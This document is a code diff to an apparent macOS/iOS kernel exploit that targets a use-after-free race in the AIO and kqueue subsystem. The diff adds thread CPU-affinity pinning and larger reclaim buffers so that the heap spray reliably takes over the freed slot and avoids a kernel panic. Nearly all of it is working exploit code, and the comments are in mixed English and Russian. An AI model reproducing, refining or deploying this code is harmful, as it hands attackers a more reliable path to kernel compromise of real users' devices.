@@ -51,6 +51,8 @@
 
 #include "exploit.h"
 #include <aio.h>
+#include <mach/mach.h>
+#include <mach/thread_policy.h>
 #include <sys/event.h>
 #include <fcntl.h>
 #include <stdlib.h>
@@ -76,14 +78,20 @@ static void aio_logx(const char *tag, const char *fmt, ...)
 #define SIGEV_KEVENT 4
 #endif
 
-#define VICTIM_NB 0x1000
+#define VICTIM_NB AIO_FILE_SZ
 #define RECL_NB   0x0200
+/* the reclaim reads aio_nbytes bytes from the file, and the kernel stores
+ * the number of bytes actually transferred in the entry's returnval - that
+ * is what shows up in kev.ext[1]. The marker has to fit in the file, or
+ * the read comes up short and the marker never appears. */
+#define AIO_FILE_SZ 0x10000
+#define AIO_AFFINITY_TAG 0
 #define RECL_NB_MARKER 0x4141   /* 'AAAA' — лейбл спрея в kev.ext[1], чтобы проверить
                                   * что ядро копирует контролируемые байты наружу */
 #define UDATA_RECL 0xBEE2
 
-static char  s_buf1[4096];
-static char  s_buf2[4096];
+static char  s_buf1[AIO_FILE_SZ];
+static char  s_buf2[AIO_FILE_SZ];
 static struct aiocb s_cb1;
 static struct aiocb s_cb2;
 
@@ -94,7 +102,23 @@ static struct aiocb s_cb2;
  * coin flip; eight is the technique the donor uses for its ~70% rate. */
 #define AIO_NRECLAIM 8
 static struct aiocb s_rcb[AIO_NRECLAIM];
-static char        s_rbuf[AIO_NRECLAIM][1024];
+static char        s_rbuf[AIO_NRECLAIM][AIO_FILE_SZ];
+
+/* CPU pinning. The donor PoC pins the main thread AND the racer to the
+ * same CPU: the free and the reclaim then hit the same per-CPU zone
+ * magazine, and the LIFO order makes the first allocation after the free
+ * take exactly the freed slot. Without the pin the racer can migrate
+ * between the free and the reclaim, the reclaim lands in another CPU's
+ * magazine, the freed slot stays zeroed, and filt_aioprocess reads
+ * procp == 0 -> kernel panic. This was the reason for the panic. */
+static void aio_set_affinity(int tag)
+{
+    thread_affinity_policy_data_t pol;
+    memset(&pol, 0, sizeof(pol));
+    pol.affinity_tag = (int)tag;
+    thread_policy_set(mach_thread_self(), THREAD_AFFINITY_POLICY,
+                      (thread_policy_t)&pol, THREAD_AFFINITY_POLICY_COUNT);
+}
 
 static volatile int s_racer_done;      /* 0 idle, 1 free+reclaim done, -1 fail */
 static volatile int s_racer_issued;    /* how many reclaim requests went out */
@@ -103,6 +127,7 @@ static volatile int s_racer_go;
 static void *racer_thread(void *arg)
 {
     (void)arg;
+    aio_set_affinity(AIO_AFFINITY_TAG);
     while (!s_racer_go) {
     }
     /* The free is retried instead of giving up. On the first attempt the
@@ -288,6 +313,7 @@ static int attempt_once(int attempt, nk_aio_stat_t *st)
      * Донор PoC работает только с SIGEV_NONE. */
     s_cb2.aio_sigevent.sigev_notify = SIGEV_NONE;
 
+    aio_set_affinity(AIO_AFFINITY_TAG);   /* same CPU as the racer */
     s_racer_done = 0;
     s_racer_go = 0;
     pthread_t rac;
